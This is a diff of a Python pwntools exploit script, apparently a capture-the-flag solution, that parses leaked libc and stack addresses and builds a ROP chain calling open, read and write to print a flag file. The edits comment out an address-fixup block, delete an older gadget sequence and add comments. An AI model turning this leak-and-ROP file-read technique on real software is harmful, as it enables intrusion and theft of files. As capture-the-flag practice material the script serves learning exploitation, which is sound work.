@@ -105,6 +105,8 @@ def main():
 
     r.recvuntil(b"name: ")
     libc_start_main_ret, decode_addr = [int(p, 16) for p in r.recvuntil(b"\n", drop=True).split(b'.')[:2]]
+
+    """ Idk pooter decided it was 32b for addresses for a bit
     decode_addr |= 0x7fff_0000_0000 # for some reason, 2 MSB are not printing
                                     # therefore, we pray that this is right
     if(args.GDB):
@@ -114,6 +116,7 @@ def main():
             decode_addr |= int(upper, 16) << 32
         else:
             print("fine :(")
+    # """
 
     main_scope_ret_addr = decode_addr - 0x110
     flag_addr = decode_addr - 0x158
@@ -128,18 +131,12 @@ def main():
     # rop.raw(rop.ret)                            # just in case, like usual
     rop.call("open", [flag_addr, 0, 0])
     # read/write the flag into the global section of the exe
-    """
-    ## wtf is the rop syntax here lol
-    rop.raw(libc.address + 0x0000000000041563) # : push rax ; ret
-    rop.raw(libc.address + 0x000000000002a3e5) # : pop rdi ; ret
-    rop.rsi = 0x404000
-    rop.rdx = 0xff
-    rop.call("read")
-    """
     rop.call("read", [3, 0x404080, 0xff])
     rop.call("write", [1, 0x404080, 0xff])
     rop.call("exit", [0])
 
+    # set up a bunch of addresses on the stack such that we can easily write
+    # what we want
     addr_table_size = 0x90
     shorts_per_req = addr_table_size // 0x10 - 1
 
